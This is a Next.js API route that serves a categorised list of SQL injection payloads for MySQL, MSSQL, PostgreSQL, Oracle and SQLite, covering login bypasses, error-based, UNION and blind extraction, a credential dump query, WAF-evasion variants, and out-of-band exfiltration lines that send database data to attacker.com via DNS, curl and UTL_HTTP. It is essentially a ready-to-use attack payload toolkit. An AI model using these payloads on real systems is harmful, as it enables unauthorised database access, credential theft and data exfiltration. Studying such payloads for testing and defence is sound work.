import { NextRequest, NextResponse } from "next/server";

type SQLiPayload = {
  label: string;
  payload: string;
  technique: string;
  dbms: string;
  risk: "low" | "medium" | "high" | "critical";
  description: string;
};

type SQLiCategory = {
  label: string;
  description: string;
  payloads: SQLiPayload[];
};

function generateSQLiPayloads(target: string): SQLiCategory[] {
  const param = target.trim() || "id";

  return [
    {
      label: "Authentication Bypass",
      description: "Bypass login forms and authentication checks",
      payloads: [
        { label: "Classic OR bypass", payload: `' OR '1'='1`, technique: "Boolean", dbms: "All", risk: "critical", description: "Classic auth bypass — always true condition" },
        { label: "Comment bypass", payload: `' OR 1=1--`, technique: "Boolean", dbms: "MySQL/MSSQL", risk: "critical", description: "Terminate query with comment, bypass password check" },
        { label: "Admin bypass", payload: `admin'--`, technique: "Comment", dbms: "MySQL/MSSQL", risk: "critical", description: "Login as admin without password" },
        { label: "Hash bypass", payload: `' OR 1=1 LIMIT 1--`, technique: "Boolean", dbms: "MySQL", risk: "critical", description: "Limit to first row — bypass hash comparison" },
        { label: "MSSQL bypass", payload: `' OR 1=1--`, technique: "Boolean", dbms: "MSSQL", risk: "critical", description: "MSSQL specific comment style" },
        { label: "Oracle bypass", payload: `' OR 1=1--`, technique: "Boolean", dbms: "Oracle", risk: "critical", description: "Oracle double-dash comment bypass" },
        { label: "Null byte bypass", payload: `admin'%00`, technique: "Null Byte", dbms: "PHP/MySQL", risk: "high", description: "Null byte injection to truncate query" },
        { label: "Double quote bypass", payload: `" OR "1"="1`, technique: "Boolean", dbms: "All", risk: "critical", description: "Double quote variant for apps using double quotes" },
      ],
    },
    {
      label: "Error-Based Extraction",
      description: "Extract data via database error messages",
      payloads: [
        { label: "MySQL extractvalue", payload: `' AND extractvalue(1,concat(0x7e,database()))--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "Extract current database name via XML error" },
        { label: "MySQL updatexml", payload: `' AND updatexml(1,concat(0x7e,(SELECT version())),1)--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "Extract MySQL version via updatexml error" },
        { label: "MySQL floor", payload: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "Extract DB name using FLOOR+RAND duplicate key error" },
        { label: "MSSQL convert", payload: `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`, technique: "Error-Based", dbms: "MSSQL", risk: "high", description: "Extract table names via conversion error" },
        { label: "MSSQL strtoint", payload: `' AND 1=1/@@version--`, technique: "Error-Based", dbms: "MSSQL", risk: "high", description: "Leak MSSQL version via arithmetic error" },
        { label: "Oracle utl_inaddr", payload: `' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--`, technique: "Error-Based", dbms: "Oracle", risk: "high", description: "Extract Oracle user via network error" },
        { label: "PostgreSQL cast", payload: `' AND CAST((SELECT version()) AS int)--`, technique: "Error-Based", dbms: "PostgreSQL", risk: "high", description: "Extract PostgreSQL version via cast error" },
      ],
    },
    {
      label: "UNION-Based Extraction",
      description: "Extract data by appending UNION SELECT statements",
      payloads: [
        { label: "Column count detection", payload: `' ORDER BY 1--`, technique: "UNION", dbms: "All", risk: "medium", description: "Detect number of columns — increment until error" },
        { label: "NULL union probe", payload: `' UNION SELECT NULL,NULL,NULL--`, technique: "UNION", dbms: "All", risk: "medium", description: "Probe with NULLs — adjust count to match columns" },
        { label: "DB version", payload: `' UNION SELECT NULL,@@version,NULL--`, technique: "UNION", dbms: "MySQL/MSSQL", risk: "high", description: "Extract database version" },
        { label: "Current DB", payload: `' UNION SELECT NULL,database(),NULL--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "Extract current database name" },
        { label: "Table enumeration", payload: `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "List all tables in current database" },
        { label: "Column enumeration", payload: `' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "List columns of target table" },
        { label: "Credential dump", payload: `' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users--`, technique: "UNION", dbms: "MySQL", risk: "critical", description: "Dump username:password pairs" },
        { label: "PostgreSQL tables", payload: `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--`, technique: "UNION", dbms: "PostgreSQL", risk: "high", description: "List PostgreSQL public schema tables" },
        { label: "MSSQL sysobjects", payload: `' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--`, technique: "UNION", dbms: "MSSQL", risk: "high", description: "List MSSQL user tables" },
      ],
    },
    {
      label: "Blind Boolean-Based",
      description: "Extract data through true/false application responses",
      payloads: [
        { label: "Basic boolean", payload: `' AND 1=1--`, technique: "Blind Boolean", dbms: "All", risk: "medium", description: "True condition — compare with AND 1=2 for false" },
        { label: "Substring detection", payload: `' AND SUBSTRING(database(),1,1)='a'--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "Extract DB name char by char" },
        { label: "Length detection", payload: `' AND LENGTH(database())>5--`, technique: "Blind Boolean", dbms: "MySQL", risk: "medium", description: "Detect database name length" },
        { label: "User detection", payload: `' AND (SELECT SUBSTRING(user(),1,1))='r'--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "Extract MySQL user character by character" },
        { label: "Table existence", payload: `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "Check if 'users' table exists" },
        { label: "MSSQL boolean", payload: `' AND (SELECT TOP 1 SUBSTRING(name,1,1) FROM sysobjects WHERE xtype='U')='u'--`, technique: "Blind Boolean", dbms: "MSSQL", risk: "high", description: "MSSQL blind extraction from sysobjects" },
      ],
    },
    {
      label: "Time-Based Blind",
      description: "Infer data through deliberate response delays",
      payloads: [
        { label: "MySQL sleep", payload: `' AND SLEEP(5)--`, technique: "Time-Based", dbms: "MySQL", risk: "medium", description: "5-second delay confirms SQLi vulnerability" },
        { label: "MySQL conditional sleep", payload: `' AND IF(1=1,SLEEP(5),0)--`, technique: "Time-Based", dbms: "MySQL", risk: "high", description: "Conditional sleep — exploitable for data extraction" },
        { label: "MySQL char extraction", payload: `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--`, technique: "Time-Based", dbms: "MySQL", risk: "high", description: "Extract DB name via timing — sleep if match" },
        { label: "MSSQL waitfor", payload: `'; WAITFOR DELAY '0:0:5'--`, technique: "Time-Based", dbms: "MSSQL", risk: "medium", description: "MSSQL 5-second delay — stacked query required" },
        { label: "MSSQL conditional", payload: `'; IF (1=1) WAITFOR DELAY '0:0:5'--`, technique: "Time-Based", dbms: "MSSQL", risk: "high", description: "Conditional MSSQL delay for blind extraction" },
        { label: "PostgreSQL pg_sleep", payload: `'; SELECT pg_sleep(5)--`, technique: "Time-Based", dbms: "PostgreSQL", risk: "medium", description: "PostgreSQL 5-second delay" },
        { label: "Oracle DBMS_PIPE", payload: `' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`, technique: "Time-Based", dbms: "Oracle", risk: "medium", description: "Oracle time-based via pipe message timeout" },
      ],
    },
    {
      label: "WAF Evasion",
      description: "Bypass Web Application Firewall filters",
      payloads: [
        { label: "Case variation", payload: `' uNiOn SeLeCt NULL,database(),NULL--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Mixed case to bypass case-sensitive WAF rules" },
        { label: "Comment injection", payload: `' UN/**/ION SE/**/LECT NULL,database(),NULL--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Inline comments to break keyword detection" },
        { label: "Double URL encode", payload: `%2527%2520OR%25201%253D1--`, technique: "WAF Bypass", dbms: "All", risk: "high", description: "Double URL encoding to bypass WAF decoding" },
        { label: "Whitespace bypass", payload: `'%09OR%091=1--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Tab instead of space to bypass space filtering" },
        { label: "Newline bypass", payload: `'\nOR\n1=1--`, technique: "WAF Bypass", dbms: "All", risk: "high", description: "Newline chars to split keywords across lines" },
        { label: "Scientific notation", payload: `' OR 1.0=1.0--`, technique: "WAF Bypass", dbms: "All", risk: "medium", description: "Numeric comparison variant to bypass integer checks" },
        { label: "Hex encoding", payload: `' OR 0x313d31--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Hex-encoded payload to bypass string detection" },
        { label: "CHAR() bypass", payload: `' OR CHAR(49)=CHAR(49)--`, technique: "WAF Bypass", dbms: "MySQL/MSSQL", risk: "high", description: "Use CHAR() function to avoid literal string filtering" },
      ],
    },
    {
      label: "Out-of-Band (OOB)",
      description: "Exfiltrate data via DNS or HTTP to external server",
      payloads: [
        { label: "MySQL DNS exfil", payload: `' AND LOAD_FILE(concat('\\\\\\\\',database(),'.attacker.com\\\\a'))--`, technique: "OOB", dbms: "MySQL", risk: "critical", description: "DNS exfiltration via LOAD_FILE UNC path (Windows MySQL)" },
        { label: "MSSQL DNS lookup", payload: `'; EXEC master..xp_dirtree '\\\\'+@@version+'.attacker.com\\a'--`, technique: "OOB", dbms: "MSSQL", risk: "critical", description: "DNS lookup via xp_dirtree with data in subdomain" },
        { label: "PostgreSQL COPY TO", payload: `'; COPY (SELECT user) TO PROGRAM 'curl http://attacker.com/'||(SELECT user)--`, technique: "OOB", dbms: "PostgreSQL", risk: "critical", description: "HTTP exfiltration via COPY TO PROGRAM" },
        { label: "Oracle UTL_HTTP", payload: `' AND utl_http.request('http://attacker.com/'||(SELECT user FROM dual)) IS NOT NULL--`, technique: "OOB", dbms: "Oracle", risk: "critical", description: "HTTP OOB exfiltration via Oracle UTL_HTTP" },
      ],
    },
    {
      label: "Detection & Fingerprinting",
      description: "Identify database type and version",
      payloads: [
        { label: "MySQL version", payload: `' AND '1'=CONVERT(1,CHAR)--`, technique: "Fingerprint", dbms: "MySQL", risk: "low", description: "MySQL-specific syntax for version fingerprinting" },
        { label: "MSSQL check", payload: `' AND 1=@@ROWCOUNT--`, technique: "Fingerprint", dbms: "MSSQL", risk: "low", description: "MSSQL-specific @@ROWCOUNT global variable" },
        { label: "Oracle check", payload: `' AND 1=(SELECT 1 FROM DUAL)--`, technique: "Fingerprint", dbms: "Oracle", risk: "low", description: "Oracle DUAL table confirms Oracle DBMS" },
        { label: "PostgreSQL check", payload: `' AND 1=version()::int--`, technique: "Fingerprint", dbms: "PostgreSQL", risk: "low", description: "PostgreSQL cast operator :: confirms PostgreSQL" },
        { label: "SQLite check", payload: `' AND 1=sqlite_version()--`, technique: "Fingerprint", dbms: "SQLite", risk: "low", description: "SQLite version function fingerprint" },
        { label: "Generic probe", payload: `'`, technique: "Fingerprint", dbms: "All", risk: "low", description: "Single quote — basic error trigger for any DBMS" },
        { label: "DBMS via error", payload: `' AND 1=convert(int,@@version)--`, technique: "Fingerprint", dbms: "MSSQL", risk: "low", description: "Trigger conversion error to leak DBMS version in message" },
      ],
    },
  ];
}

export async function GET(req: NextRequest) {
  const target = req.nextUrl.searchParams.get("q");
  const filter = req.nextUrl.searchParams.get("dbms"); // optional filter

  if (!target) {
    return NextResponse.json({ error: "Target parameter (param name) required" }, { status: 400 });
  }

  const categories = generateSQLiPayloads(target);

  // Apply DBMS filter if provided
  const filtered = filter
    ? categories.map((cat) => ({
        ...cat,
        payloads: cat.payloads.filter((p) =>
          p.dbms.toLowerCase().includes(filter.toLowerCase()) || p.dbms === "All"
        ),
      })).filter((cat) => cat.payloads.length > 0)
    : categories;

  const totalPayloads = filtered.reduce((sum, cat) => sum + cat.payloads.length, 0);

  return NextResponse.json({
    target,
    dbmsFilter: filter ?? "all",
    totalCategories: filtered.length,
    totalPayloads,
    categories: filtered,
    supportedDBMS: ["MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite"],
    timestamp: new Date().toISOString(),
  });
}
